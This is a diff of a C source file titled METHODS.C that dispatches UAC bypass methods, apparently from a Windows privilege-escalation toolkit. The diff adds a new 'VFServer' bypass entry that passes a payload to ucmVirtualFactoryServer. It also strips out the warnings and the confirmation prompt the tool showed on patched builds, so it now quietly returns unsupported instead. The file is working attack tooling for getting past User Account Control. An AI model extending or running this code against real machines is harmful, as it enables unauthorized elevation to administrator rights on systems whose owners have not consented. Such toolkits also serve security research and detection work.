@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.60
+*  VERSION:     3.61
 *
-*  DATE:        27 Apr 2022
+*  DATE:        22 Jun 2022
 *
 *  UAC bypass dispatch.
 *
@@ -47,6 +47,7 @@ UCM_API(MethodPca);
 UCM_API(MethodCurVer);
 UCM_API(MethodMsdt);
 UCM_API(MethodDotNetSerial);
+UCM_API(MethodVFServer);
 
 ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodWow64Logger,
@@ -58,7 +59,8 @@ ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodMsSettingsProtocol,
     UacMethodMsStoreProtocol,
     UacMethodPca,
-    UacMethodCurVer
+    UacMethodCurVer,
+    UacMethodVFServer
 };
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
@@ -135,7 +137,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodCurVer, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodNICPoison, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodMsdt, { NT_WIN10_THRESHOLD1, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE },
-    { MethodDotNetSerial, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }
+    { MethodDotNetSerial, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
+    { MethodVFServer, { NT_WIN8_BLUE, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE }
 };
 
 /*
@@ -171,13 +174,11 @@ NTSTATUS IsMethodMatchRequirements(
 #ifdef _DEBUG
     UNREFERENCED_PARAMETER(Entry);
 #else
-    WCHAR szMessage[MAX_PATH];
     //
     //  Check Wow64 flags first. Disable this check for debugging build.
     //
     if (g_ctx->IsWow64) {
         if (Entry->DisallowWow64) {
-            ucmShowMessageById(g_ctx->OutputToDebugger, ISDB_USAGE_WOW_DETECTED);
             return STATUS_NOT_SUPPORTED;
         }
     }
@@ -187,7 +188,6 @@ NTSTATUS IsMethodMatchRequirements(
         // Not required if Win32.
         //
         if (Entry->Win32OrWow64Required != FALSE) {
-            ucmShowMessageById(g_ctx->OutputToDebugger, ISDB_USAGE_WOW64WIN32ONLY);
             return STATUS_NOT_SUPPORTED;
         }
     }
@@ -197,19 +197,10 @@ NTSTATUS IsMethodMatchRequirements(
     //  Check availability. Disable this check for debugging build.
     //
     if (g_ctx->dwBuildNumber < Entry->Availability.MinumumWindowsBuildRequired) {
-        RtlSecureZeroMemory(&szMessage, sizeof(szMessage));
-        _strcpy(szMessage, L"Current Windows Build: ");
-        ultostr(g_ctx->dwBuildNumber, _strend(szMessage));
-        _strcat(szMessage, L"\nMinimum Windows Build Required: ");
-        ultostr(Entry->Availability.MinumumWindowsBuildRequired, _strend(szMessage));
-        _strcat(szMessage, L"\nAborting execution.");
-        ucmShowMessage(g_ctx->OutputToDebugger, szMessage);
         return STATUS_NOT_SUPPORTED;
     }
     if (g_ctx->dwBuildNumber >= Entry->Availability.MinimumExpectedFixedWindowsBuild) {
-        if (ucmShowQuestionById(ISDB_USAGE_UACFIX) == IDNO) {
-            return STATUS_NOT_SUPPORTED;
-        }
+        return STATUS_NOT_SUPPORTED;
     }
 #endif
     return STATUS_SUCCESS;
@@ -250,8 +241,6 @@ VOID PostCleanupAttempt(
         ucmHakrilMethodCleanup();
         break;
 
-    default:
-        break;
     }
 }
 
@@ -705,8 +694,6 @@ UCM_API(MethodProtocolHijack)
         }
         break;
 
-    default:
-        break;
     }
 
     return Result;
@@ -770,4 +757,11 @@ UCM_API(MethodDotNetSerial)
         lpszPayload = g_ctx->szOptionalParameter;
 
     return ucmDotNetSerialMethod(lpszPayload);
+}
+
+UCM_API(MethodVFServer)
+{
+    return ucmVirtualFactoryServer(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
 }
